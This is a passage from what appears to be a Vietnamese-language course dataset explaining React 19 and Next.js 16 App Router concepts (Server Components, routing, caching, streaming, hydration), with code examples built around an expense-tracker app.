x: "Ô lọc trên bảng 5.000 giao dịch làm input giật. Cho bảng dùng giá trị trễ, còn input cập nhật ngay:<pre>const [q, setQ] = useState('');\nconst deferredQ = useDeferredValue(q);\nconst stale = q !== deferredQ;\nreturn (\n  &lt;&gt;\n    &lt;input value={q} onChange={(e) =&gt; setQ(e.target.value)} /&gt;\n    &lt;div style={{ opacity: stale ? 0.6 : 1 }}&gt;\n      &lt;TxTable query={deferredQ} /&gt; {/* TxTable bọc memo */}\n    &lt;/div&gt;\n  &lt;/&gt;\n);</pre>Trong App Router, Server Component có thể truyền <code>getTxPromise(userId)</code> chưa await xuống Client Component; client đọc bằng <code>use(promise)</code> bên trong <code>&lt;Suspense&gt;</code>, vừa stream dữ liệu vừa giữ được tương tác."
},
"w1k7": {
c: "React 19 cho phép truyền một hàm (Action) vào <code>&lt;form action&gt;</code>; ba hook đi kèm là <code>useActionState</code> (giữ state do action trả về), <code>useOptimistic</code> (hiện kết quả tạm khi action đang chạy) và <code>useFormStatus</code> (đọc trạng thái pending của form cha).",
e: "<ul><li><b>useActionState(action, initialState)</b> (từ <code>react</code>) trả về <code>[state, formAction, isPending]</code>; action nhận <code>(prevState, formData)</code>. Với Server Action, form submit được cả khi JavaScript chưa tải xong (progressive enhancement).</li><li><b>useOptimistic(state, updateFn)</b> trả về giá trị optimistic và hàm thêm cập nhật tạm; hàm đó phải được gọi trong Action hoặc transition. Khi action kết thúc, giá trị quay về <code>state</code> thật.</li><li><b>useFormStatus()</b> (từ <code>react-dom</code>) trả về <code>{ pending, data, method, action }</code> của <i>form cha gần nhất</i>, nên phải gọi trong một component con nằm bên trong <code>&lt;form&gt;</code>, không phải trong component render ra form đó.</li></ul>Bẫy hay gặp: khi action chạy xong, React tự reset các field uncontrolled; nếu validate lỗi mà action không trả lại giá trị đã nhập, người dùng mất hết dữ liệu.",
x: "Form “Thêm giao dịch” dùng Server Action, hiển thị lỗi validate và nút có trạng thái đang lưu:<pre>'use client';\nfunction SubmitButton() {\n  const { pending } = useFormStatus();\n  return &lt;button disabled={pending}&gt;{pending ? 'Đang lưu…' : 'Lưu'}&lt;/button&gt;;\n}\nexport function AddTxForm() {\n  const [state, formAction] = useActionState(addTransaction, { errors: {}, values: {} });\n  return (\n    &lt;form action={formAction}&gt;\n      &lt;input name='amount' defaultValue={state.values.amount} /&gt;\n      {state.errors.amount &amp;&amp; &lt;p role='alert'&gt;{state.errors.amount}&lt;/p&gt;}\n      &lt;SubmitButton /&gt;\n    &lt;/form&gt;\n  );\n}</pre>Action trả về <code>values</code> đã gửi, nhờ đó <code>defaultValue</code> giữ lại dữ liệu khi có lỗi."
},
"w1k8": {
c: "Custom hook là hàm bắt đầu bằng <code>use</code> gói logic có state hoặc effect để dùng lại; composition là ghép component bằng cách truyền component khác qua <code>children</code> hoặc prop dạng slot, thay vì đẩy dữ liệu qua nhiều tầng (prop drilling).",
e: "Custom hook chia sẻ <i>logic</i>, không chia sẻ <i>state</i>: mỗi component gọi hook có state riêng của nó. Đặt tên theo mục đích (<code>useDebouncedValue</code>, <code>useMediaQuery</code>) và tuân thủ Rules of Hooks (chỉ gọi ở top level của component hoặc hook khác). Đừng bọc mọi thứ thành hook: hàm không dùng hook nào thì chỉ nên là hàm thường. Với prop drilling, hãy thử composition trước khi dùng context: component trung gian nhận <code>children</code> hoặc slot (<code>header</code>, <code>actions</code>), còn component cha trực tiếp render phần cần dữ liệu rồi truyền vào. Cách này giảm phụ thuộc và giảm render lại, vì <code>children</code> được tạo ở cha nên không render lại khi state của component trung gian đổi. Trong App Router, đây cũng là cách đặt Server Component bên trong Client Component.",
x: "Dashboard có <code>Card</code> (Client Component, có nút thu gọn) cần hiển thị số dư lấy từ DB. Thay vì drill <code>balance</code> qua <code>Page → Grid → Card</code>, truyền nội dung qua slot; kèm một hook dùng lại cho ô tìm kiếm:<pre>function useDebouncedValue&lt;T&gt;(value: T, ms = 300) {\n  const [v, setV] = useState(value);\n  useEffect(() =&gt; {\n    const t = setTimeout(() =&gt; setV(value), ms);\n    return () =&gt; clearTimeout(t);\n  }, [value, ms]);\n  return v;\n}\n\n// page.tsx (Server Component)\n&lt;Card title='Số dư' actions={&lt;ExportButton /&gt;}&gt;\n  &lt;BalanceSummary userId={user.id} /&gt;\n&lt;/Card&gt;</pre><code>BalanceSummary</code> vẫn là Server Component đọc DB dù được hiển thị bên trong <code>Card</code> chạy ở client."
},
"w2k0": {
c: "App Router định tuyến theo cấu trúc thư mục trong <code>app/</code>: mỗi thư mục là một route segment, và các file đặc biệt (<code>layout</code>, <code>page</code>, <code>loading</code>, <code>error</code>, <code>not-found</code>, <code>template</code>, <code>route</code>) quyết định UI và hành vi của segment đó.",
e: "<ul><li><b>layout</b> bọc segment và các con, giữ nguyên state khi điều hướng giữa các page con và không render lại. <b>template</b> giống layout nhưng mount lại ở mỗi lần điều hướng (reset state, chạy lại effect).</li><li><b>page</b> làm segment truy cập được qua URL. <b>loading</b> tự bọc page trong <code>&lt;Suspense&gt;</code>. <b>error</b> là error boundary, bắt buộc là Client Component, nhận <code>error</code> và <code>retry()</code> (ổn định từ 16.3, tải lại dữ liệu rồi render lại; <code>reset()</code> vẫn còn), và không bắt lỗi của layout cùng cấp. <b>not-found</b> hiện khi gọi <code>notFound()</code>.</li><li><b>(group)</b>: thư mục trong ngoặc tròn để tổ chức code và chia layout, không xuất hiện trong URL. <b>[id]</b> là dynamic segment, <b>[...slug]</b> là catch-all (cần ít nhất một đoạn), <b>[[...slug]]</b> là optional catch-all (khớp cả đường dẫn gốc).</li></ul>Thứ tự lồng trong một segment: layout, template, error, loading, not-found, page.",
x: "Cấu trúc của lab tuần 2, phần marketing và phần app có layout riêng, trang chi tiết có loading và error riêng:<pre>app/\n  (marketing)/page.tsx                // /\n  (app)/layout.tsx                    // sidebar\n  (app)/transactions/page.tsx         // /transactions\n  (app)/transactions/loading.tsx\n  (app)/transactions/[id]/page.tsx\n  (app)/transactions/[id]/error.tsx\n  (app)/transactions/[id]/not-found.tsx\n  (app)/reports/[[...range]]/page.tsx // /reports và /reports/2026/10</pre>Trong <code>[id]/page.tsx</code>, khi không tìm thấy giao dịch thì gọi <code>notFound()</code> để trả 404 thật thay vì render trang trống. Nếu hai route group có hai root layout khác nhau, điều hướng giữa chúng sẽ là full page load."
},
"w2k1": {
c: "Server Component chỉ chạy trên server (lúc build hoặc lúc request), có thể async, truy cập DB và secret trực tiếp, và không gửi JavaScript của nó xuống trình duyệt; Client Component có state, effect, event handler và được đánh dấu bằng <code>'use client'</code>.",
e: "Trong App Router, mọi component mặc định là Server Component. Client Component vẫn được prerender ra HTML trên server rồi hydrate ở trình duyệt; “client” nghĩa là có code chạy ở trình duyệt, không có nghĩa là chỉ render ở client. <code>'use client'</code> là ranh giới <b>module</b>, không phải ranh giới component: file có directive và mọi module nó import đều vào bundle client, nên không cần và không nên đặt directive ở mọi file con. Một component không có directive sẽ là Server hay Client tùy nơi import nó. Server Component không dùng được <code>useState</code>, <code>useEffect</code>, context, <code>window</code>; Client Component không import được module server-only và không thể là hàm async. Nguyên tắc: giữ phần lớn cây là server, đẩy <code>'use client'</code> xuống các component lá cần tương tác.",
x: "Trang <code>/transactions</code>: danh sách đọc DB nên là Server Component, chỉ nút xóa cần tương tác:<pre>// app/(app)/transactions/page.tsx (Server Component)\nimport { listMyTx } from '@/data/transactions';\nimport { DeleteButton } from './delete-button';\n\nexport default async function Page() {\n  const txs = await listMyTx(currentMonth());\n  return txs.map((t) =&gt; (\n    &lt;div key={t.id}&gt;{t.note} &lt;DeleteButton id={t.id} /&gt;&lt;/div&gt;\n  ));\n}\n\n// delete-button.tsx\n'use client';\nexport function DeleteButton({ id }: { id: string }) { /* onClick + useTransition */ }</pre>Nếu đặt <code>'use client'</code> ở page, thư viện format ngày, markdown và cả code truy cập DB bị kéo vào bundle client, hoặc build báo lỗi vì module server-only."
},
"w2k2": {
c: "Props đi từ Server Component sang Client Component phải serialize được bởi React để gửi trong RSC payload; muốn đặt Server Component bên trong Client Component thì truyền nó qua <code>children</code> hoặc một prop dạng slot.",
e: "Giá trị hợp lệ: primitive, <code>Date</code>, <code>Map</code>, <code>Set</code>, typed array, plain object và mảng chứa giá trị hợp lệ, Promise, JSX (kể cả Server Component đã render) và Server Function (<code>'use server'</code>). Không hợp lệ: hàm thường, instance của class, object có prototype riêng, Symbol không đăng ký toàn cục. Lỗi hay gặp: truyền <code>onSelect</code> từ server xuống, truyền nguyên record từ ORM (chứa field nhạy cảm, kiểu <code>Decimal</code>), hoặc truyền instance <code>User</code>. Client Component không import được Server Component (import vào thì nó trở thành code client), nhưng có thể nhận Server Component qua <code>children</code>: server render trước, client chỉ đặt kết quả vào đúng chỗ. Đây là pattern để provider, modal, tabs chạy ở client trong khi nội dung bên trong vẫn render ở server.",
x: "Lỗi thật khi chuyển Expense Tracker sang App Router: “Functions cannot be passed directly to Client Components...” vì page truyền <code>formatAmount</code> xuống <code>TxChart</code>. Hai cách sửa: định dạng dữ liệu sẵn ở server, hoặc import hàm thuần trực tiếp trong file client. Để bảng vẫn là Server Component khi nằm trong tab chạy ở client:<pre>// tabs.tsx\n'use client';\nexport function Tabs({ list, chart }: { list: React.ReactNode; chart: React.ReactNode }) {\n  const [tab, setTab] = useState&lt;'list' | 'chart'&gt;('list');\n  return &lt;&gt;{/* nút chuyển tab */}{tab === 'list' ? list : chart}&lt;/&gt;;\n}\n\n// page.tsx (server)\n&lt;Tabs list={&lt;TxTable /&gt;} chart={&lt;TxChart data={toChartDTO(txs)} /&gt;} /&gt;</pre>"
},
"w2k3": {
c: "<code>&lt;Link&gt;</code> là component điều hướng phía client có prefetch; <code>useRouter</code>, <code>usePathname</code>, <code>useSearchParams</code> (import từ <code>next/navigation</code>) là các hook của Client Component để điều hướng bằng code và đọc URL hiện tại.",
e: "<ul><li><b>Link</b> render thẻ <code>&lt;a&gt;</code> thật (tốt cho SEO, mở được tab mới), điều hướng không tải lại trang và giữ layout chung. <b>Prefetch</b> chỉ chạy ở production khi link vào viewport. Mặc định (<code>'auto'</code>): route tĩnh được prefetch toàn bộ, route động chỉ tới <code>loading.js</code> gần nhất. Khi bật Partial Prefetching (16.4 khuyến nghị dùng cùng Cache Components), mặc định chuyển thành prefetch App Shell; <code>prefetch={true}</code> lấy thêm nội dung riêng của link đó; <code>false</code> tắt hẳn.</li><li><b>useRouter</b>: <code>push</code>, <code>replace</code>, <code>refresh</code>, <code>prefetch</code>, <code>back</code>; dùng để điều hướng sau một sự kiện, còn link thông thường thì dùng <code>Link</code>.</li><li><b>usePathname</b>: đường dẫn hiện tại, hay dùng để đánh dấu mục đang active. <b>useSearchParams</b>: <code>URLSearchParams</code> chỉ đọc; khi prerender nó phải nằm trong <code>&lt;Suspense&gt;</code>, nếu không build báo lỗi.</li></ul>Lỗi hay gặp: import <code>useRouter</code> từ <code>next/router</code> của Pages Router.",
x: "Thanh điều hướng báo cáo của Expense Tracker cần đánh dấu mục đang mở, và nút “Tháng sau” đổi query mà không làm mất các filter khác:<pre>'use client';\nimport Link from 'next/link';\nimport { usePathname, useRouter, useSearchParams } from 'next/navigation';\nexport function MonthNav({ nextMonth }: { nextMonth: string }) {\n  const pathname = usePathname();\n  const params = useSearchParams();\n  const router = useRouter();\n  const next = new URLSearchParams(params); next.set('month', nextMonth);\n  return (\n    &lt;nav&gt;\n      &lt;Link href='/reports' aria-current={pathname === '/reports' ? 'page' : undefined}&gt;Báo cáo&lt;/Link&gt;\n      &lt;button onClick={() =&gt; router.replace(`${pathname}?${next}`, { scroll: false })}&gt;Tháng sau&lt;/button&gt;\n    &lt;/nav&gt;\n  );\n}</pre>Bọc <code>&lt;MonthNav /&gt;</code> trong <code>&lt;Suspense&gt;</code> ở layout để phần còn lại của trang vẫn được prerender."
},
"w2k4": {
c: "Từ Next.js 16, <code>params</code>, <code>searchParams</code> và các hàm <code>cookies()</code>, <code>headers()</code>, <code>draftMode()</code> chỉ còn dạng Promise và phải <code>await</code>; <code>PageProps</code>, <code>LayoutProps</code>, <code>RouteContext</code> là type helper toàn cục Next.js sinh ra theo từng route.",
e: "Next.js 15 đã chuyển các API này sang async nhưng vẫn cho truy cập đồng bộ kèm cảnh báo; Next.js 16 bỏ hẳn phần tương thích đó. Lý do: Next.js cần biết chính xác chỗ nào dùng dữ liệu của request để prerender phần còn lại và chỉ chờ ở đúng điểm đó, đây là nền tảng của Partial Prerendering. Trong Server Component dùng <code>await</code>; trong Client Component dùng <code>use(params)</code>, hoặc đọc qua <code>useParams</code>/<code>useSearchParams</code>. Đừng <code>await params</code> ở đầu layout nếu không cần, vì nó kéo cả cây về request time; truyền Promise xuống component nằm trong <code>&lt;Suspense&gt;</code> rồi mới await. Type helper được sinh khi chạy <code>next dev</code>, <code>next build</code> hoặc <code>next typegen</code>, cho <code>params</code> đúng kiểu theo chuỗi route và báo lỗi khi gõ sai tên segment. Codemod cho phần này: <code>npx @next/codemod@canary next-async-request-api .</code>",
x: "Nâng Expense Tracker từ 15 lên 16, build lỗi ở trang chi tiết vì còn đọc <code>params.id</code> đồng bộ. Bản đúng dùng type helper và await:<pre>// app/(app)/transactions/[id]/page.tsx\nexport default async function Page(props: PageProps&lt;'/transactions/[id]'&gt;) {\n  const { id } = await props.params;\n  const { tab = 'info' } = await props.searchParams;\n  const tx = await getTransaction(id);\n  if (!tx) notFound();\n  return &lt;TxDetail tx={tx} tab={String(tab)} /&gt;;\n}\n\n// app/api/tx/[id]/route.ts\nexport async function GET(_req: Request, ctx: RouteContext&lt;'/api/tx/[id]'&gt;) {\n  const { id } = await ctx.params;\n  return Response.json(await getTransaction(id));\n}</pre>Trên CI, chạy <code>next typegen</code> trước <code>tsc --noEmit</code> để các type helper này tồn tại khi kiểm tra type."
},
"w2k5": {
c: "Metadata API cho phép khai báo nội dung thẻ <code>&lt;head&gt;</code> (title, description, Open Graph, canonical) bằng object <code>metadata</code> hoặc hàm <code>generateMetadata</code>; <code>next/image</code> và <code>next/font</code> là component và module có sẵn để tối ưu ảnh và font.",
e: "<ul><li><b>metadata / generateMetadata</b>: chỉ export được từ Server Component (layout, page). Metadata của segment con được gộp với cha và ghi đè khi trùng key; <code>title.template</code> ở layout tạo dạng “%s · Expense Tracker”. Trang động dùng <code>generateMetadata({ params })</code>, và dùng chung hàm đọc dữ liệu bọc <code>React.cache</code> (hoặc <code>'use cache'</code>) để page và metadata không truy vấn hai lần.</li><li><b>next/image</b>: resize theo thiết bị, dùng định dạng hiện đại (WebP, AVIF), lazy load mặc định, bắt buộc có kích thước (hoặc <code>fill</code>) để giữ chỗ chống CLS; ảnh từ domain ngoài phải khai báo <code>images.remotePatterns</code>.</li><li><b>next/font</b>: tải font Google hoặc font local lúc build và tự host cùng app, nên trình duyệt không gọi tới Google; tự tạo font fallback chỉnh <code>size-adjust</code> để giảm nhảy layout khi font tải xong.</li></ul>",
x: "Trang danh mục công khai của Expense Tracker cần title và canonical riêng, font hỗ trợ tiếng Việt:<pre>// app/(app)/categories/[slug]/page.tsx\nconst getCategory = cache(async (slug: string) =&gt; db.category.findUnique({ where: { slug } }));\n\nexport async function generateMetadata(props: PageProps&lt;'/categories/[slug]'&gt;): Promise&lt;Metadata&gt; {\n  const { slug } = await props.params;\n  const cat = await getCategory(slug);\n  return { title: cat?.name ?? 'Không tìm thấy', alternates: { canonical: `/categories/${slug}` } };\n}\n\n// app/layout.tsx\nconst inter = Inter({ subsets: ['latin', 'vietnamese'], display: 'swap' });\n&lt;html lang='vi' className={inter.className}&gt;</pre>Ảnh bìa: <code>&lt;Image src={cat.cover} alt={cat.name} width={1200} height={400} sizes='100vw' /&gt;</code>, có kích thước nên không gây CLS."
},
"w2k6": {
c: "Parallel routes render nhiều trang độc lập trong cùng một layout thông qua các slot <code>@tên</code>; intercepting routes (<code>(.)</code>, <code>(..)</code>, <code>(...)</code>) cho phép hiển thị một route ngay trong ngữ cảnh trang hiện tại khi điều hướng phía client, ví dụ modal có URL riêng.",
e: "<ul><li><b>Slot</b> như <code>@analytics</code> không xuất hiện trong URL; nó được truyền vào layout dưới dạng prop cùng tên, bên cạnh <code>children</code>. Mỗi slot có loading và error riêng, điều hướng độc lập.</li><li><b>default.js</b>: khi tải cứng (refresh) một URL mà slot không có trang khớp, Next.js render <code>default.js</code> của slot đó. Từ Next.js 16, mọi slot bắt buộc có <code>default.js</code>, thiếu là build lỗi; muốn giữ hành vi cũ thì return <code>null</code> hoặc gọi <code>notFound()</code>.</li><li><b>Intercepting</b> tính theo route segment chứ không theo thư mục file: <code>(.)</code> cùng cấp, <code>(..)</code> lên một cấp, <code>(...)</code> tính từ gốc <code>app</code>. Click link trong app thì thấy modal; refresh hoặc mở link trực tiếp thì ra trang đầy đủ.</li></ul>Lỗi hay gặp: đóng modal bằng <code>router.back()</code> khi không có lịch sử, và đếm cả slot <code>@modal</code> như một segment khi tính <code>(..)</code>.",
x: "Lab tuần 2: click một giao dịch trong danh sách mở modal chi tiết, URL đổi thành <code>/transactions/123</code>, refresh vẫn ra trang chi tiết đầy đủ:<pre>app/(app)/transactions/\n  layout.tsx               // nhận { children, modal }\n  page.tsx\n  [id]/page.tsx            // trang đầy đủ\n  @modal/default.tsx       // return null (bắt buộc từ v16)\n  @modal/(.)[id]/page.tsx  // modal khi điều hướng client\n\n// layout.tsx\nexport default function Layout({ children, modal }: LayoutProps&lt;'/transactions'&gt;) {\n  return &lt;&gt;{children}{modal}&lt;/&gt;;\n}</pre>Modal là Client Component dùng <code>&lt;dialog&gt;</code>, đóng bằng <code>router.back()</code>. Người mở từ link chia sẻ thì nhận trang đầy đủ, nên không gặp vấn đề không có lịch sử để back."
},
"w2k7": {
c: "Hydration là bước React ở trình duyệt gắn event handler và state vào HTML mà server đã render; hydration error xảy ra khi kết quả render đầu tiên ở client khác với HTML nhận được từ server.",
e: "Khi không khớp, React báo lỗi và render lại phần đó ở client (có thể tới cả ranh giới Suspense gần nhất), làm mất lợi ích của SSR và gây nháy UI. Nguyên nhân hay gặp: <ul><li>Giá trị phụ thuộc thời điểm hoặc môi trường: <code>Date.now()</code>, <code>Math.random()</code>, <code>toLocaleString()</code> khi server (thường chạy UTC) và trình duyệt khác múi giờ hoặc locale.</li><li>Đọc <code>window</code>, <code>localStorage</code>, <code>matchMedia</code> trong lúc render, hoặc rẽ nhánh theo <code>typeof window</code>.</li><li>HTML lồng sai: <code>&lt;div&gt;</code> trong <code>&lt;p&gt;</code>, <code>&lt;a&gt;</code> trong <code>&lt;a&gt;</code>, bảng thiếu <code>&lt;tbody&gt;</code>.</li><li>Extension trình duyệt chèn thuộc tính vào DOM trước khi React hydrate.</li></ul>Cách sửa: format ngày với <code>timeZone</code> cố định; đọc giá trị chỉ có ở trình duyệt sau khi mount (<code>useEffect</code> hoặc <code>useSyncExternalStore</code> có <code>getServerSnapshot</code>); sửa cấu trúc HTML. <code>suppressHydrationWarning</code> chỉ dành cho khác biệt có chủ ý và chỉ có tác dụng ở đúng một cấp phần tử.",
x: "Expense Tracker hiển thị ngày bằng <code>new Date(tx.createdAt).toLocaleDateString()</code>. Server chạy UTC, người dùng ở Việt Nam (UTC+7): giao dịch lúc 6 giờ sáng ngày 15 giờ Việt Nam là 23 giờ ngày 14 theo UTC, nên HTML server ghi “14/10” còn client ghi “15/10”, gây lỗi hydration. Sửa bằng cách cố định locale và múi giờ:<pre>const fmt = new Intl.DateTimeFormat('vi-VN', {\n  timeZone: 'Asia/Ho_Chi_Minh',\n  day: '2-digit', month: '2-digit', year: 'numeric',\n});\nexport const formatDate = (iso: string) =&gt; fmt.format(new Date(iso));</pre>Theme sáng/tối lưu trong <code>localStorage</code> thì dùng một script nhỏ trong <code>&lt;head&gt;</code> đặt <code>data-theme</code> trước khi paint, kèm <code>suppressHydrationWarning</code> trên thẻ <code>&lt;html&gt;</code>."
},
"w2k8": {
c: "Next.js 16 dùng Turbopack làm bundler mặc định cho cả <code>next dev</code> và <code>next build</code>, hỗ trợ file cấu hình <code>next.config.ts</code> có type, và đổi tên quy ước <code>middleware.ts</code> thành <code>proxy.ts</code>.",
e: "<ul><li><b>Turbopack</b>: bundler viết bằng Rust, không còn cần cờ <code>--turbopack</code>; cấu hình nằm ở key <code>turbopack</code> cấp cao nhất thay cho <code>experimental.turbopack</code>. Nếu project có cấu hình <code>webpack</code> tùy biến (kể cả do plugin chèn vào), <code>next build</code> dừng lại để tránh build sai: chuyển sang tùy chọn tương đương của Turbopack, hoặc chạy <code>next build --webpack</code> để giữ webpack. Cache biên dịch trên đĩa bật mặc định nên khởi động lại nhanh.</li><li><b>next.config.ts</b>: export object kiểu <code>NextConfig</code>, có autocomplete và báo lỗi khi gõ sai key.</li><li><b>proxy.ts</b>: chạy trước khi route render (redirect, rewrite, sửa header); export hàm <code>proxy</code>; runtime là Node.js và không cấu hình được. Ai còn cần edge runtime thì tạm giữ <code>middleware.ts</code> (đã deprecated). Codemod: <code>npx @next/codemod@canary middleware-to-proxy .</code></li></ul>Cùng đợt này Next.js 16 bỏ lệnh <code>next lint</code> và yêu cầu Node.js 20.9 trở lên.",
x: "Khi nâng cấp, build của Expense Tracker dừng vì một plugin cũ chèn cấu hình <code>webpack</code> dùng <code>resolve.fallback</code> cho <code>fs</code>. Cách đúng là sửa import để code client không đụng tới module của Node; nếu chưa sửa ngay được thì dùng <code>turbopack.resolveAlias</code>. Proxy chỉ chuyển hướng người chưa có cookie:<pre>// next.config.ts\nimport type { NextConfig } from 'next';\nconst nextConfig: NextConfig = {\n  reactCompiler: true,\n  turbopack: { resolveAlias: { fs: { browser: './empty.ts' } } },\n};\nexport default nextConfig;\n\n// proxy.ts\nimport { NextResponse, type NextRequest } from 'next/server';\nexport function proxy(req: NextRequest) {\n  if (!req.cookies.has('session')) return NextResponse.redirect(new URL('/login', req.url));\n}\nexport const config = { matcher: ['/transactions/:path*', '/reports/:path*'] };</pre>"
},
"w3k0": {
c: "Trong App Router, Server Component là hàm async nên có thể <code>await</code> trực tiếp <code>fetch</code>, ORM hoặc SDK ngay trong thân component; <code>React.cache</code> ghi nhớ kết quả của một hàm theo tham số trong phạm vi một request trên server, để nhiều component gọi cùng tham số chỉ chạy một lần.",
e: "Không cần <code>useEffect</code> hay API route trung gian: truy vấn chạy trên server, gần DB, và secret không lộ ra client. <ul><li><b>Tuần tự</b>: <code>await a(); await b();</code> khiến <code>b</code> phải chờ <code>a</code> dù không phụ thuộc nhau, tổng thời gian cộng dồn. Chỉ làm vậy khi <code>b</code> thật sự cần kết quả của <code>a</code>.</li><li><b>Song song</b>: khởi tạo các Promise trước rồi <code>await Promise.all([...])</code>, hoặc tách thành các component async riêng, mỗi cái có Suspense riêng để chạy và stream độc lập.</li><li><b>React.cache</b>: dedupe trong một request, ví dụ <code>getUser(id)</code> được gọi ở layout, page và <code>generateMetadata</code>. Nó không chia sẻ giữa các request hay giữa các user, và mỗi hàm <code>'use cache'</code> có phạm vi <code>React.cache</code> riêng. Hàm cache phải khai báo ở module scope, không tạo bên trong component.</li></ul>Next.js cũng tự dedupe các lời gọi <code>fetch</code> GET cùng URL và cùng option trong một lần render.",
x: "Dashboard ban đầu mất 1,2 giây vì ba truy vấn chạy nối tiếp nhau, mỗi cái khoảng 400 ms. Chạy song song thì còn khoảng 400 ms:<pre>// data/user.ts\nexport const getUser = cache(async (id: string) =&gt; db.user.findUnique({ where: { id } }));\n\n// app/(app)/dashboard/page.tsx\nexport default async function Dashboard() {\n  const session = await verifySession();\n  const [user, summary, recent] = await Promise.all([\n    getUser(session.userId),\n    getMonthlySummary(session.userId),\n    getRecentTx(session.userId, 10),\n  ]);\n  return &lt;DashboardView user={user} summary={summary} recent={recent} /&gt;;\n}</pre>Layout cũng gọi <code>getUser</code> để hiện avatar, nhưng nhờ <code>cache</code> nên cả request chỉ có một truy vấn user. Bước tiếp theo là tách <code>recent</code> thành component riêng trong Suspense để phần tổng hiện trước."
},
"w3k1": {
c: "Streaming là việc server gửi HTML và RSC payload thành nhiều đợt trong cùng một response: phần đã sẵn sàng gửi trước, mỗi ranh giới <code>&lt;Suspense&gt;</code> đang chờ dữ liệu hiện fallback và được thay bằng nội dung thật khi dữ liệu về.",
e: "Không có streaming, trang phải chờ truy vấn chậm nhất rồi mới gửi byte đầu tiên. Có Suspense, người dùng thấy layout và skeleton ngay (TTFB, FCP tốt hơn), vùng nào xong trước hiện trước; React còn hydrate có chọn lọc, ưu tiên vùng người dùng đang tương tác. <code>loading.tsx</code> là Suspense cho cả page; tự đặt <code>&lt;Suspense&gt;</code> cho từng khu vực thì kiểm soát tốt hơn. <b>Waterfall</b> xảy ra khi: await tuần tự những việc độc lập; component cha await xong mới render con, con lại await tiếp; layout await dữ liệu mà page không cần. Cách tránh: đẩy <code>await</code> xuống component lá; khởi tạo Promise sớm rồi truyền xuống cho con đọc bằng <code>use()</code> hoặc await; gom việc độc lập bằng <code>Promise.all</code>. Đánh đổi: quá nhiều Suspense nhỏ làm trang hiện lên lộn xộn từng mảnh; fallback nên có kích thước gần đúng để tránh CLS. Khi tự host sau nginx phải tắt buffering, nếu không streaming mất tác dụng.",
x: "Dashboard Expense Tracker: tổng tháng nhanh (50 ms), danh sách giao dịch chậm (800 ms), biểu đồ theo danh mục chậm hơn nữa (1,2 s). Cho ba vùng stream độc lập:<pre>export default function Dashboard() {\n  return (\n    &lt;&gt;\n      &lt;Suspense fallback={&lt;SummarySkeleton /&gt;}&gt;&lt;MonthSummary /&gt;&lt;/Suspense&gt;\n      &lt;Suspense fallback={&lt;ListSkeleton rows={10} /&gt;}&gt;&lt;RecentTx /&gt;&lt;/Suspense&gt;\n      &lt;Suspense fallback={&lt;ChartSkeleton /&gt;}&gt;&lt;CategoryChart /&gt;&lt;/Suspense&gt;\n    &lt;/&gt;\n  );\n}\n\nasync function RecentTx() {\n  const { userId } = await verifySession();\n  const txs = await getRecentTx(userId, 10);\n  return &lt;TxList txs={txs} /&gt;;\n}</pre>Page không await gì ở cấp cao nhất nên shell được gửi ngay, ba component chạy song song và hiện lên theo thứ tự xong việc."
},
"w3k2": {
c: "Cache Components là mô hình rendering và caching của Next.js 16, bật bằng <code>cacheComponents: true</code>: mọi dữ liệu mặc định chạy lúc request, bạn chủ động đánh dấu phần được cache bằng <code>'use cache'</code> kèm <code>cacheLife</code> và <code>cacheTag</code>, và Next.js prerender phần tĩnh thành static shell.",
e: "<ul><li><b>Dynamic mặc định</b>: không còn cache ngầm cho <code>fetch</code>; truy cập dữ liệu không cache phải nằm trong <code>&lt;Suspense&gt;</code>, nếu không dev overlay báo route bị chặn (blocking route).</li><li><b>'use cache'</b> đặt ở đầu file, component hoặc hàm async; tham số và biến closure tự trở thành cache key, giá trị trả về phải serializable. Không đọc <code>cookies()</code>/<code>headers()</code> bên trong; đọc bên ngoài rồi truyền vào làm tham số.</li><li><b>cacheLife</b>: profile có sẵn (<code>seconds</code>, <code>minutes</code>, <code>hours</code>, <code>days</code>, <code>weeks</code>, <code>max</code>) hoặc object <code>{ stale, revalidate, expire }</code>; không gọi thì dùng <code>default</code> (stale 5 phút, revalidate 15 phút). Cache quá ngắn (<code>expire</code> dưới 5 phút) bị loại khỏi prerender và thành “lỗ động”. <b>cacheTag</b> gắn nhãn để invalidate theo yêu cầu.</li><li><b>Static shell (PPR)</b>: phần tĩnh, phần đã cache và fallback của Suspense được prerender, phục vụ ngay; phần động stream vào trong cùng response.</li></ul>Từ 16.4, <code>create-next-app</code> bật sẵn mô hình này, và nó dự kiến thành mặc định ở Next.js 17.",
x: "Lab tuần 3: tổng chi theo tháng được cache theo user và tháng, còn danh sách giao dịch luôn tươi:<pre>async function MonthTotal({ userId, month }: { userId: string; month: string }) {\n  'use cache';\n  cacheLife('hours');\n  cacheTag(`summary:${userId}`);\n  const total = await db.tx.sumByMonth(userId, month);\n  return &lt;p&gt;Tổng chi {formatVnd(total)}&lt;/p&gt;;\n}\n\nexport default function Dashboard() {\n  return (\n    &lt;Suspense fallback={&lt;Skeleton /&gt;}&gt;\n      &lt;UserArea /&gt; {/* đọc session, render MonthTotal và TxList */}\n    &lt;/Suspense&gt;\n  );\n}</pre>Khi user thêm giao dịch, Server Action gọi <code>updateTag(`summary:${userId}`)</code>. Vì <code>userId</code> là tham số nên mỗi user có cache entry riêng, không lẫn dữ liệu giữa người dùng."
},
"w3k3": {
c: "Với Cache Components, runtime API (<code>cookies()</code>, <code>headers()</code>, <code>searchParams</code>) chỉ có giá trị khi có request thật, nên component dùng chúng phải nằm trong <code>&lt;Suspense&gt;</code>; <code>connection()</code> đánh dấu “chờ request” cho code không đọc runtime API nhưng vẫn phải chạy lúc request.",
e: "Khi prerender, Next.js render cây cho tới khi gặp truy cập runtime API hoặc dữ liệu không cache; chỗ đó cần ranh giới Suspense để fallback được đưa vào static shell. Suspense càng sâu thì shell càng chứa nhiều nội dung thật. Truy cập ở page hoặc layout mà không có Suspense bao ngoài sẽ bị báo blocking route. <b>connection()</b> dùng khi kết quả phải khác nhau theo từng request nhưng code không đọc header hay cookie: <code>new Date()</code>, <code>Math.random()</code>, <code>crypto.randomUUID()</code>, hoặc đọc <code>process.env</code> lúc runtime để một Docker image chạy được nhiều môi trường. Thiếu nó, các lời gọi <code>new Date()</code>/<code>Math.random()</code> trong lúc prerender làm build lỗi. <code>connection()</code> bị cấm bên trong <code>'use cache'</code> và <code>'use cache: private'</code>. Nó thay thế cho <code>unstable_noStore()</code> trước đây.",
